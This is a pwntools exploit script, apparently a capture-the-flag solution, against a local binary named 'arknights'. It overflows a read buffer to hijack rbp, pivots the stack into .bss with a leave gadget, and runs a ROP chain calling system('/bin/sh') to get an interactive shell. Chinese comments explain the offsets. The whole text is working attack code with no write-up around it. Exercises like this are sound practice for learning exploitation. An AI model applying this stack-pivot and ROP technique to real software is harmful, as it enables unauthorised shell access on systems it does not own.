from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'amd64', os = 'linux')
r = process('./arknights')
#r = remote("ip",port)
e = ELF('./arknights')


bss = e.bss() + 0x100
rdi = 0x401935
leave = 0x401393
main_read = 0x4018EF
system = e.plt['system']
call_sys =0x401785

r.send(b'\n')
r.sendline(b'4')
r.sendline(b'1')
payload = b'a'*0x40 + p64(bss+0x40) + p64(main_read)
r.send(payload)#劫持rbp并调用有漏洞的read
#rbp位于bss+0x100+0x40

sleep(1)
payload = b'a'*8 + p64(rdi) + p64(bss+0x20) + p64(call_sys) + b'/bin/sh\x00'
#b'a'*8是因为leave命令组执行时导致的
#起始位置bss+0x100,payload = 0x108 + 0x110 + 0x118 + 0x120(/bin/sh位,即bss+0x20)
payload = payload.ljust(0x40,b'a') + p64(bss) + p64(leave)#劫持rsp
#一共leave两次
#第一次rsp到bss+0x100+0x40+0x10
#第二次rsp到bss+0x100,rsp从bss+0x100+8开始运行
r.send(payload)

r.interactive()